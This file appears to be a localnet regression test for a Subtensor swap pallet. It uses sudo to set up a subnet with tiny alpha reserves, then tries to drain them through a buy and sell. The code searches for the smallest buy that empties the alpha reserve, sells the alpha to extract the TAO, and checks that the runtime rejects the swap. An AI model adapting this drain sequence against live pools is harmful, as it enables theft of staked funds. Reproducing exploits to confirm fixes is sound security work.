import assert from "node:assert/strict";

import { Keyring } from "@polkadot/api";
import { u8aToHex } from "@polkadot/util";

import { connectApi } from "../lib/api.js";
import { createTempLogger } from "../lib/file-log.js";

const WS_ENDPOINT = process.env.WS_ENDPOINT ?? "ws://127.0.0.1:9944";
const RUN_ID = process.env.BALANCER_ZERO_ALPHA_RUN_ID ?? `run${Date.now()}p${process.pid}`;
const ALPHA_RESERVE = BigInt(process.env.BALANCER_ZERO_ALPHA_ALPHA_RESERVE ?? "1000");
const TAO_RESERVE = BigInt(process.env.BALANCER_ZERO_ALPHA_TAO_RESERVE ?? "5000000000000000");
const ATTACKER_FUNDING = BigInt(process.env.BALANCER_ZERO_ALPHA_ATTACKER_FUNDING ?? "9000000000000000");
const QUOTE_WEIGHT = BigInt(process.env.BALANCER_ZERO_ALPHA_QUOTE_WEIGHT ?? "990000000000000000");
const REVIEW_TAO_IN = BigInt(process.env.BALANCER_ZERO_ALPHA_REVIEW_TAO_IN ?? "2860000000000000");
const MAX_PRICE = 18_446_744_073_709_551_615n;
const MIN_PRICE = 0n;

const keyring = new Keyring({ type: "sr25519" });
const alice = keyring.addFromUri("//Alice");
const ownerHotkey = keyring.addFromUri(`//ZeroAlphaDrain//${RUN_ID}//owner-hotkey`);
const attacker = keyring.addFromUri(`//ZeroAlphaDrain//${RUN_ID}//attacker`);
const logger = createTempLogger("test-balancer-zero-alpha-drain-localnet.log");
logger.captureConsole();

let api;

async function main() {
  await logger.start();
  api = await connectApi(WS_ENDPOINT, { log: console.log });

  try {
    const chain = await api.rpc.system.chain();
    const runtimeVersion = await api.rpc.state.getRuntimeVersion();
    const startHeader = await api.rpc.chain.getHeader();
    console.log("chain:", chain.toString());
    console.log("runtime:", runtimeVersion.specName.toString(), runtimeVersion.specVersion.toString());
    console.log("start block:", startHeader.number.toString());
    console.log("run id:", RUN_ID);
    console.log("owner hotkey:", ownerHotkey.address);
    console.log("attacker:", attacker.address);

    assertMetadataAvailable();
    await assertAliceIsSudo();
    await prepareSubnetRegistration();
    await fundAttacker();

    const netuid = await registerSubnet();
    await enableSubtoken(netuid);
    await setPoolReserves(netuid, { alpha: ALPHA_RESERVE, tao: TAO_RESERVE });

    const initialReserves = await readReserves(netuid);
    const attackerFreeBefore = await freeBalance(attacker.address);
    console.log("created netuid:", netuid);
    console.log("initial reserves:", formatReserves(initialReserves));
    console.log("attacker free before:", attackerFreeBefore.toString());

    const search = await findSmallestBuyForAlphaOut(netuid, ALPHA_RESERVE);
    if (search.amount === null) {
      console.log(
        "no draining buy found:",
        `max_checked=${search.maxChecked}`,
        `max_sim=${formatSim(search.maxSim)}`
      );
      await assertReviewedBuyRejected(netuid);
      console.log(
        "attack not reproduced:",
        `review_tao_in=${REVIEW_TAO_IN}`,
        `alpha_reserve=${ALPHA_RESERVE}`,
        `tao_reserve=${TAO_RESERVE}`,
        "runtime rejected/zeroed the below-minimum-reserve swap before alpha could be drained"
      );
      return;
    }

    const attackBuy = search.amount;
    const buySim = await simSwapTaoForAlpha(netuid, attackBuy);
    console.log("selected attack buy:", `tao_in=${attackBuy}`, `sim=${formatSim(buySim)}`);

    const buyResult = await submitAndWait(
      attacker,
      api.tx.subtensorModule.addStakeLimit(ownerHotkey.address, netuid, attackBuy, MAX_PRICE, false),
      "attack addStakeLimit"
    );
    const alphaBought = stakeAddedFromEvents(buyResult.events, ownerHotkey.address, netuid);
    const afterBuyReserves = await readReserves(netuid);
    const attackerFreeAfterBuy = await freeBalance(attacker.address);
    const attackerAlphaAfterBuy = await hotkeyAlpha(ownerHotkey.address, attacker.address, netuid);
    console.log("alpha bought:", alphaBought.toString());
    console.log("attacker alpha after buy:", attackerAlphaAfterBuy.toString());
    console.log("reserves after buy:", formatReserves(afterBuyReserves));
    console.log("attacker free after buy:", attackerFreeAfterBuy.toString());

    const sellSim = await simSwapAlphaForTao(netuid, alphaBought);
    console.log("sell sim after buy:", formatSim(sellSim));

    let sellOutcome;
    try {
      const sellResult = await submitAndWait(
        attacker,
        api.tx.subtensorModule.removeStakeLimit(ownerHotkey.address, netuid, alphaBought, MIN_PRICE, false),
        "attack removeStakeLimit"
      );
      const removed = stakeRemovedFromEvents(sellResult.events, ownerHotkey.address, netuid);
      sellOutcome = { ok: true, removed };
    } catch (error) {
      sellOutcome = { ok: false, error };
      console.log("sell failed:", error.message);
    }

    const finalReserves = await readReserves(netuid);
    const attackerFreeAfterSell = await freeBalance(attacker.address);
    console.log("reserves after sell attempt:", formatReserves(finalReserves));
    console.log("attacker free after sell attempt:", attackerFreeAfterSell.toString());

    if (sellOutcome.ok) {
      const extracted = attackerFreeAfterSell - attackerFreeAfterBuy;
      const netFreeChange = attackerFreeAfterSell - attackerFreeBefore;
      console.log(
        "attack reproduced:",
        `tao_used=${attackBuy}`,
        `alpha_bought=${alphaBought}`,
        `tao_extracted_after_buy=${extracted}`,
        `net_free_change=${netFreeChange}`,
        `stake_removed=${sellOutcome.removed.alphaRemoved}`,
        `fee_paid=${sellOutcome.removed.feePaid}`
      );
      assert.ok(afterBuyReserves.alpha === 0n, `buy did not drain alpha reserve to zero: ${afterBuyReserves.alpha}`);
      assert.ok(extracted >= TAO_RESERVE, `sell did not extract whole initial TAO reserve: ${extracted} < ${TAO_RESERVE}`);
    } else {
      console.log(
        "attack not reproduced:",
        `tao_used=${attackBuy}`,
        `alpha_bought=${alphaBought}`,
        `post_buy_alpha_reserve=${afterBuyReserves.alpha}`,
        `sell_error=${sellOutcome.error.message}`
      );
      assert.notEqual(afterBuyReserves.alpha, 0n, "buy drained alpha to zero but sell was rejected");
    }
  } finally {
    await api?.disconnect();
    await logger.flush();
  }
}

main().catch(async (error) => {
  await logger.error(error);
  await logger.flush();
  process.exit(1);
});

function assertMetadataAvailable() {
  const missing = [
    ["Sudo.sudo", api.tx.sudo?.sudo],
    ["System.setStorage", api.tx.system?.setStorage],
    ["Balances.forceSetBalance", api.tx.balances?.forceSetBalance],
    ["SubtensorModule.registerNetwork", api.tx.subtensorModule?.registerNetwork],
    ["SubtensorModule.addStakeLimit", api.tx.subtensorModule?.addStakeLimit],
    ["SubtensorModule.removeStakeLimit", api.tx.subtensorModule?.removeStakeLimit],
    ["SubtensorModule.SubnetTAO", api.query.subtensorModule?.subnetTAO],
    ["SubtensorModule.SubnetAlphaIn", api.query.subtensorModule?.subnetAlphaIn],
    ["SubtensorModule.SubnetAlphaOut", api.query.subtensorModule?.subnetAlphaOut],
    ["SubtensorModule.SubtokenEnabled", api.query.subtensorModule?.subtokenEnabled],
    ["SubtensorModule.SubnetLimit", api.query.subtensorModule?.subnetLimit],
    ["SubtensorModule.NetworkRateLimit", api.query.subtensorModule?.networkRateLimit],
    ["SubtensorModule.NetworkRegistrationStartBlock", api.query.subtensorModule?.networkRegistrationStartBlock],
    ["SubtensorModule.TotalHotkeyAlpha", api.query.subtensorModule?.totalHotkeyAlpha],
    ["Swap.SwapBalancer", api.query.swap?.swapBalancer],
  ].filter(([, value]) => !value);

  assert.equal(missing.length, 0, `missing metadata: ${missing.map(([name]) => name).join(", ")}`);
}

async function assertAliceIsSudo() {
  const sudoKey = await api.query.sudo.key();
  assert.equal(sudoKey.toString(), alice.address, `Alice is not sudo; sudo key is ${sudoKey.toString()}`);
}

async function prepareSubnetRegistration() {
  const activeCount = await activeNonRootSubnetCount();
  const subnetLimit = (await api.query.subtensorModule.subnetLimit()).toNumber();
  const targetLimit = Math.max(subnetLimit, activeCount + 1);
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(
      api.tx.system.setStorage([
        [api.query.subtensorModule.subnetLimit.key(), storageValueHex("u16", targetLimit)],
        [api.query.subtensorModule.networkRateLimit.key(), storageValueHex("u64", 0n)],
        [api.query.subtensorModule.networkRegistrationStartBlock.key(), storageValueHex("u64", 0n)],
      ])
    ),
    "sudo prepare subnet registration"
  );
  console.log("registration settings:", `subnet_limit=${targetLimit}`, "network_rate_limit=0", "start_block=0");
}

async function activeNonRootSubnetCount() {
  const entries = await api.query.subtensorModule.networksAdded.entries();
  return entries.filter(([key, value]) => value.isTrue && key.args[0].toNumber() !== 0).length;
}

async function fundAttacker() {
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.balances.forceSetBalance(attacker.address, ATTACKER_FUNDING)),
    "fund attacker"
  );
  console.log("attacker funded:", `free=${await freeBalance(attacker.address)}`);
}

async function registerSubnet() {
  const result = await submitAndWait(
    alice,
    api.tx.subtensorModule.registerNetwork(ownerHotkey.address),
    "registerNetwork"
  );
  const event = result.events.find(
    ({ event }) => event.section === "subtensorModule" && event.method === "NetworkAdded"
  );
  assert.ok(event, "NetworkAdded event not found");
  const netuid = event.event.data[0].toNumber();
  assert.equal((await api.query.subtensorModule.networksAdded(netuid)).isTrue, true, `${netuid} was not added`);
  return netuid;
}

async function enableSubtoken(netuid) {
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(
      api.tx.system.setStorage([[api.query.subtensorModule.subtokenEnabled.key(netuid), storageValueHex("bool", true)]])
    ),
    `sudo enable subtoken ${netuid}`
  );
}

async function setPoolReserves(netuid, { alpha, tao }) {
  const subnetAccount = await getSubnetAccountId(netuid);
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(
      api.tx.system.setStorage([
        [api.query.swap.swapBalancer.key(netuid), storageValueHex("PalletSubtensorSwapBalancer", { quote: QUOTE_WEIGHT })],
        [api.query.subtensorModule.subnetTAO.key(netuid), storageValueHex("u64", tao)],
        [api.query.subtensorModule.subnetAlphaIn.key(netuid), storageValueHex("u64", alpha)],
        [api.query.subtensorModule.subnetAlphaOut.key(netuid), storageValueHex("u64", 0n)],
      ])
    ),
    "set review pool reserves"
  );
  await submitAndWait(
    alice,
    api.tx.sudo.sudo(api.tx.balances.forceSetBalance(subnetAccount, tao + ATTACKER_FUNDING)),
    "fund subnet account"
  );
  console.log("subnet account funded:", `account=${subnetAccount}`, `free=${await freeBalance(subnetAccount)}`);
  console.log("balancer weight:", (await api.query.swap.swapBalancer(netuid)).toHuman());
}

async function getSubnetAccountId(netuid) {
  const encoded = await api._rpcCore.provider.send("subnetInfo_getSubnetAccountId", [netuid, null]);
  const account = api.createType("Option<AccountId32>", Uint8Array.from(encoded));
  assert.ok(account.isSome, `subnet account id not found for netuid ${netuid}`);
  return account.unwrap().toString();
}

async function findSmallestBuyForAlphaOut(netuid, targetAlphaOut) {
  let low = 1n;
  let high = 1n;
  let maxSim = await simSwapTaoForAlpha(netuid, high);
  while (maxSim.amountPaidOut < targetAlphaOut) {
    high *= 2n;
    if (high > ATTACKER_FUNDING) {
      return { amount: null, maxChecked: high / 2n, maxSim };
    }
    maxSim = await simSwapTaoForAlpha(netuid, high);
  }

  while (low < high) {
    const mid = (low + high) / 2n;
    if ((await simSwapTaoForAlpha(netuid, mid)).amountPaidOut >= targetAlphaOut) {
      high = mid;
    } else {
      low = mid + 1n;
    }
  }

  return { amount: low, maxChecked: high, maxSim };
}

async function assertReviewedBuyRejected(netuid) {
  const sim = await simSwapTaoForAlpha(netuid, REVIEW_TAO_IN);
  console.log("review buy sim:", `tao_in=${REVIEW_TAO_IN}`, `sim=${formatSim(sim)}`);

  try {
    await submitAndWait(
      attacker,
      api.tx.subtensorModule.addStakeLimit(ownerHotkey.address, netuid, REVIEW_TAO_IN, MAX_PRICE, false),
      "review addStakeLimit"
    );
  } catch (error) {
    console.log("review buy rejected:", error.message);
    assert.match(error.message, /\b(ReservesTooLow|InsufficientLiquidity|AmountTooLow)\b/);
    return;
  }

  throw new Error(`review buy unexpectedly succeeded with tao_in=${REVIEW_TAO_IN}`);
}

async function simSwapTaoForAlpha(netuid, tao) {
  const bytes = await api._rpcCore.provider.send("swap_simSwapTaoForAlpha", [netuid, Number(tao), null]);
  const decoded = decodeSixFieldSimSwap(bytes);
  return {
    amountPaidIn: decoded.taoAmount,
    amountPaidOut: decoded.alphaAmount,
    feePaid: decoded.taoFee,
    secondaryFeePaid: decoded.alphaFee,
    taoSlippage: decoded.taoSlippage,
    alphaSlippage: decoded.alphaSlippage,
  };
}

async function simSwapAlphaForTao(netuid, alpha) {
  const bytes = await api._rpcCore.provider.send("swap_simSwapAlphaForTao", [netuid, Number(alpha), null]);
  const decoded = decodeSixFieldSimSwap(bytes);
  return {
    amountPaidIn: decoded.alphaAmount,
    amountPaidOut: decoded.taoAmount,
    feePaid: decoded.alphaFee,
    secondaryFeePaid: decoded.taoFee,
    taoSlippage: decoded.taoSlippage,
    alphaSlippage: decoded.alphaSlippage,
  };
}

function decodeSixFieldSimSwap(bytes) {
  const decoded = api.createType("(u64,u64,u64,u64,u64,u64)", Uint8Array.from(bytes));
  const [taoAmount, alphaAmount, taoFee, alphaFee, taoSlippage, alphaSlippage] = decoded;
  return {
    taoAmount: taoAmount.toBigInt(),
    alphaAmount: alphaAmount.toBigInt(),
    taoFee: taoFee.toBigInt(),
    alphaFee: alphaFee.toBigInt(),
    taoSlippage: taoSlippage.toBigInt(),
    alphaSlippage: alphaSlippage.toBigInt(),
  };
}

async function readReserves(netuid) {
  const [tao, alpha, alphaOut] = await Promise.all([
    api.query.subtensorModule.subnetTAO(netuid),
    api.query.subtensorModule.subnetAlphaIn(netuid),
    api.query.subtensorModule.subnetAlphaOut(netuid),
  ]);
  return { tao: tao.toBigInt(), alpha: alpha.toBigInt(), alphaOut: alphaOut.toBigInt() };
}

async function freeBalance(address) {
  return (await api.query.system.account(address)).data.free.toBigInt();
}

async function hotkeyAlpha(hotkey, coldkey, netuid) {
  return (await api.query.subtensorModule.totalHotkeyAlpha(hotkey, coldkey, netuid)).toBigInt();
}

function stakeAddedFromEvents(events, hotkey, netuid) {
  const event = events.find(({ event }) => {
    if (event.section !== "subtensorModule" || event.method !== "StakeAdded") return false;
    const [, eventHotkey, , alphaStaked, eventNetuid] = event.data;
    return eventHotkey.toString() === hotkey && eventNetuid.toNumber() === netuid && alphaStaked.toBigInt() > 0n;
  });
  assert.ok(event, `StakeAdded event not found for ${hotkey} on netuid ${netuid}`);
  return event.event.data[3].toBigInt();
}

function stakeRemovedFromEvents(events, hotkey, netuid) {
  const event = events.find(({ event }) => {
    if (event.section !== "subtensorModule" || event.method !== "StakeRemoved") return false;
    const [, eventHotkey, , alphaUnstaked, eventNetuid] = event.data;
    return eventHotkey.toString() === hotkey && eventNetuid.toNumber() === netuid && alphaUnstaked.toBigInt() > 0n;
  });
  assert.ok(event, `StakeRemoved event not found for ${hotkey} on netuid ${netuid}`);
  return {
    alphaRemoved: event.event.data[3].toBigInt(),
    feePaid: event.event.data[5]?.toBigInt() ?? 0n,
  };
}

function storageValueHex(type, value) {
  return u8aToHex(api.createType(type, value).toU8a());
}

async function submitAndWait(signer, tx, label) {
  return new Promise((resolve, reject) => {
    let unsubscribe;
    let settled = false;

    const finish = (fn, value) => {
      if (settled) return;
      settled = true;
      try {
        unsubscribe?.();
      } catch {
        // ignore unsubscribe races
      }
      fn(value);
    };

    tx.signAndSend(signer, ({ status, dispatchError, events }) => {
      if (dispatchError) {
        finish(reject, new Error(`${label} dispatch failed: ${formatDispatchError(dispatchError)}`));
        return;
      }

      if (status.isInBlock || status.isFinalized) {
        const failed = events.find(({ event }) => event.section === "system" && event.method === "ExtrinsicFailed");
        if (failed) {
          finish(reject, new Error(`${label} extrinsic failed: ${formatDispatchError(failed.event.data[0])}`));
          return;
        }

        finish(resolve, { status, events });
      }
    })
      .then((unsub) => {
        unsubscribe = unsub;
      })
      .catch((error) => finish(reject, error));
  });
}

function formatDispatchError(dispatchError) {
  if (dispatchError.isModule) {
    const decoded = api.registry.findMetaError(dispatchError.asModule);
    return `${decoded.section}.${decoded.name}: ${decoded.docs.join(" ")}`;
  }
  return dispatchError.toString();
}

function formatReserves({ tao, alpha, alphaOut }) {
  return `tao=${tao} alpha_in=${alpha} alpha_out=${alphaOut}`;
}

function formatSim(value) {
  return `amountPaidIn=${value.amountPaidIn} amountPaidOut=${value.amountPaidOut} feePaid=${value.feePaid} secondaryFeePaid=${value.secondaryFeePaid} taoSlippage=${value.taoSlippage} alphaSlippage=${value.alphaSlippage}`;
}
